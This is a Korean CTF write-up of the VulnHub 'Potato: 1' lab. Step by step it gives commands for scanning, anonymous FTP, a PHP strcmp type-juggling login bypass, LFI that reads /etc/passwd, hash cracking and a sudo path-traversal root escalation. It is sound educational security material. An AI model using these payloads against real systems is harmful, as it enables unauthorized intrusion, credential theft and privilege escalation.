# 🥔 Potato: 1 — CTF Writeup

<img width="669" height="481" alt="Image" src="https://github.com/user-attachments/assets/8da61b06-2ed5-410b-bcb8-85cd76f53a09" />

> **Platform:** VulnHub  
> **Goal:** user.txt + root.txt 획득  
> **핵심 기술:** FTP Anonymous Login, PHP Type Juggling, LFI, Hash Crack, Sudo Path Traversal

---

## 📡 1단계: 호스트 탐색 — 타겟 IP 찾기

```bash
nmap -sn 172.16.11.0/24
```

> `-sn` 옵션은 포트 스캔 없이 살아있는 호스트만 빠르게 찾는 ping scan.  
> → 타겟 IP: `172.16.11.221` (Oracle VirtualBox NIC) 확인  
> → 브라우저로 `http://172.16.11.221` 접속해 웹 서비스 확인

---

## 🔍 2단계: 포트 및 서비스 스캔

```bash
nmap -sV -sC -p- 172.16.11.221
```

<img width="1138" height="526" alt="Image" src="https://github.com/user-attachments/assets/1203e414-c2f5-4ae4-8b24-d20696bac286" />

> `-sV` 버전 탐지 / `-sC` 기본 스크립트 실행 / `-p-` 전체 포트 스캔

| 포트 | 서비스 | 비고 |
|------|--------|------|
| 22/tcp | OpenSSH 8.2p1 | SSH |
| 80/tcp | Apache 2.4.41 | 웹 서버 |
| **2112/tcp** | **ProFTPD** | ⭐ **비표준 포트 FTP — 핵심 진입점!** |

> ⚠️ 2112번 FTP는 `-p-` 전체 스캔 없이는 발견 불가!

<img width="1167" height="397" alt="Image" src="https://github.com/user-attachments/assets/1b3f45dc-59bf-4e74-8db3-7e8bbbdb407e" />

---

## 🕷️ 3단계: 웹 디렉토리 열거

```bash
gobuster dir -u http://172.16.11.221 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

<img width="1139" height="473" alt="Image" src="https://github.com/user-attachments/assets/5691776a-9cfd-4cc8-8c24-38216e12dc0d" />

> 발견된 경로:
> - `/admin` (301) → 로그인 페이지 존재
> - `/potato` (301)
> - `/server-status` (403)

<img width="878" height="571" alt="Image" src="https://github.com/user-attachments/assets/f058f5f8-769b-4f42-98f2-26102a5b79e1" />

---

## ❌ 4단계: SSH 브루트포스 시도 (실패)

```bash
sudo nmap -vv --script=ssh-brute.nse -p 22 172.16.11.221
```

> 98%까지 진행했지만 유효한 크리덴셜 없음.  
> → 다른 공격 벡터 탐색 필요

---

## 📁 5단계: FTP 익명 로그인 & 소스코드 획득

```bash
ftp 172.16.11.221 2112
```

<img width="1142" height="622" alt="Image" src="https://github.com/user-attachments/assets/75890bba-872c-4ff7-a271-5a1f1cc89377" />

> ProFTPD는 설정에 따라 anonymous 로그인을 허용하는 경우가 있다. 패스워드 없이 접속을 시도했더니 성공했다.

```
Name: anonymous
Password: (그냥 엔터)

ftp> ls -al
ftp> get index.php.bak
ftp> get welcome.msg
ftp> bye
```

```bash
cat index.php.bak
```

<img width="1139" height="673" alt="Image" src="https://github.com/user-attachments/assets/5927f230-db1e-4506-ad56-215f79806572" />

> 소스코드에서 로그인 로직 발견:

```php
$pass = "potato"; // Change this password regularly

if (strcmp($_POST['username'], "admin") == 0
    && strcmp($_POST['password'], $pass) == 0) {
    setcookie('pass', $pass, time() + 365*24*3600);
}
```

> → 아이디: `admin` 확인  
> → 비밀번호는 `potato`에서 변경된 상태 → 직접 로그인 불가  
> → `http://172.16.11.221/admin/index.php?login=1` 접속 시도

<img width="1139" height="364" alt="Image" src="https://github.com/user-attachments/assets/3c18e0fa-9ea9-4512-a3e2-940916dd46b4" />

---

## 🔎 6단계: /admin 하위 경로 추가 열거

```bash
gobuster dir -u http://172.16.11.221/admin \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x .php,.txt
```

<img width="1138" height="474" alt="Image" src="https://github.com/user-attachments/assets/6493b22f-541e-4661-93d9-95f25f7b8a03" />

<img width="1132" height="348" alt="Image" src="https://github.com/user-attachments/assets/b9933a6e-1a17-47f1-b973-247d6d65f332" />

> 발견:
> - `/admin/index.php` (200)
> - `/admin/logs` (301) → **패스워드 변경 이력 로그 존재**
> - `/admin/dashboard.php` (302 → index.php 리다이렉트)

> `/admin/logs` 확인 결과, 비밀번호가 변경된 이력 확인  
> → 현재 비밀번호를 알 수 없으므로 **로그인 우회 방법** 필요

<img width="1119" height="270" alt="Image" src="https://github.com/user-attachments/assets/0c3253b4-4d86-479c-916e-881d3735b4de" />

---

## 🧪 7단계: PHP Type Juggling으로 로그인 우회

> **취약점 원리:**  
> PHP에서 `strcmp()`에 배열을 전달하면 `NULL`을 반환하고,  
> 느슨한 비교(`==`)에서 `NULL == 0`은 `true`로 평가된다.

```
strcmp([], "potato") → NULL
NULL == 0            → true  ← 로그인 우회 성공!
```

```bash
curl -X POST "http://172.16.11.221/admin/index.php?login=1" \
  -d "username=admin&password[]=" \
  -v
```

<img width="1140" height="656" alt="Image" src="https://github.com/user-attachments/assets/e69eb5b5-2dbf-4cee-8f25-3d875c62aca7" />

<img width="1150" height="309" alt="Image" src="https://github.com/user-attachments/assets/61ca8403-90b2-477d-90c2-830b1211b2ea" />

<img width="1083" height="807" alt="Image" src="https://github.com/user-attachments/assets/8ee7df52-f851-4710-9144-2b4df358bdd4" />

> 응답 헤더에서 쿠키 획득:
> ```
> Set-Cookie: pass=serdesfsefhijosefjtfgyuhjiosefdfthgyjh
> ```

```bash
# 쿠키로 dashboard 접근
curl "http://172.16.11.221/admin/dashboard.php" \
  --cookie "pass=serdesfsefhijosefjtfgyuhjiosefdfthgyjh"
```

---

## 📂 8단계: LFI(로컬 파일 인클루전)로 /etc/passwd 획득

```bash
curl "http://172.16.11.221/admin/dashboard.php?page=log" \
  --cookie "pass=serdesfsefhijosefjtfgyuhjiosefdfthgyjh" \
  -d "file=../../../../../../../etc/passwd"
```

> `file` 파라미터 입력값 미검증 → **LFI 취약점**  
> `../`를 반복해 웹루트를 벗어나 시스템 파일 접근

> 결과에서 발견:
> ```
> webadmin:$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/:1001:1001:webadmin,,,:/home/webadmin:/bin/bash
> ```


<img width="1080" height="581" alt="Image" src="https://github.com/user-attachments/assets/40f46813-ce1a-4245-bb0d-dd5fb88c76cb" />

---

## 🔓 9단계: 해시 크랙 & SSH 접속 → user.txt 획득

> `$1$`로 시작 = **MD5crypt** 해시

```bash
echo 'webadmin:$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/' > pass.txt
john pass.txt
```

<img width="1109" height="148" alt="Image" src="https://github.com/user-attachments/assets/d5b8134d-83ac-48db-867a-1dd1d0f1f3c3" />


> 크랙 결과: 비밀번호 = **`dragon`**

```bash
ssh webadmin@172.16.11.221
# password: dragon
```

<img width="1116" height="315" alt="Image" src="https://github.com/user-attachments/assets/ab642a58-0d3a-4782-af15-301c2607b355" />


```bash
cat user.txt
```

> 🎉 **user.txt 플래그 획득!**

<img width="1085" height="315" alt="Image" src="https://github.com/user-attachments/assets/41012dd6-ff71-4e38-a999-f3b7e8b555b0" />

---

## 🚀 10단계: 권한 상승 (PrivEsc) → root 획득

```bash
sudo -l
```


<img width="1085" height="354" alt="Image" src="https://github.com/user-attachments/assets/3292fa7b-ced5-42c0-9d93-6cec0804ff81" />

> 결과:
> ```
> (ALL) /bin/nice /notes/*
> ```
> `/notes/` 안의 모든 파일을 root 권한으로 실행 가능  
> 단, `/notes/` 내부에 직접 파일 생성 권한 없음

> **우회: sudo 경로 트래버설**  
> `/notes/*` 와일드카드를 `../`로 우회

```bash
cd /tmp
echo "/bin/bash -p" > exploit.sh
chmod +x exploit.sh
sudo /bin/nice /notes/../tmp/exploit.sh
```

```bash
whoami
# root
```


<img width="1087" height="203" alt="Image" src="https://github.com/user-attachments/assets/e45d8d18-5b0a-4dfc-97aa-f834e66aa081" />

```bash
cat /root/root.txt
```

<img width="1082" height="72" alt="Image" src="https://github.com/user-attachments/assets/94121d14-56fb-4777-a690-c23da888f68e" />

```bash
echo "bGljb3JuZSB1bmlxYW1iaXN0ZSBxdWkgZnVpdCBhdSBib3V0IGTigJl1biBkb3VibGUgYXJjLWVuLWNpZWwuIA==" | base64 -d
```

> 🏁 **루트 플래그 획득 완료!**

<img width="1075" height="106" alt="Image" src="https://github.com/user-attachments/assets/d9e31f21-cde8-4777-93bb-3ed214c99b8a" />

---



## 🗺️ 공격 흐름 요약

```
네트워크 스캔 → 포트 스캔 (비표준 FTP 2112 발견)
      ↓
웹 디렉토리 열거 → /admin 로그인 페이지 발견
      ↓
FTP 익명 로그인 → index.php.bak 소스코드 획득
      ↓
PHP Type Juggling → 로그인 우회 → 쿠키 획득
      ↓
LFI 취약점 → /etc/passwd → webadmin 해시 획득
      ↓
John the Ripper → MD5 크랙 → SSH 접속 (dragon)
      ↓
user.txt 🎉
      ↓
sudo -l → /bin/nice /notes/* → 경로 트래버설
      ↓
/tmp/exploit.sh → root 쉘
      ↓
root.txt + base64 디코딩 🏁
```

---

## 🛠️ 사용 도구

| 도구 | 용도 |
|------|------|
| `nmap` | 호스트/포트/서비스 스캔 |
| `gobuster` | 웹 디렉토리 열거 |
| `ftp` | 익명 FTP 접속 |
| `curl` | HTTP 요청 조작 |
| `john` | 패스워드 해시 크랙 |
| `base64` | 플래그 디코딩 |

---

> 📸 스크린샷 포함 전체 풀이: [티스토리 블로그](https://palantirops.tistory.com/46)
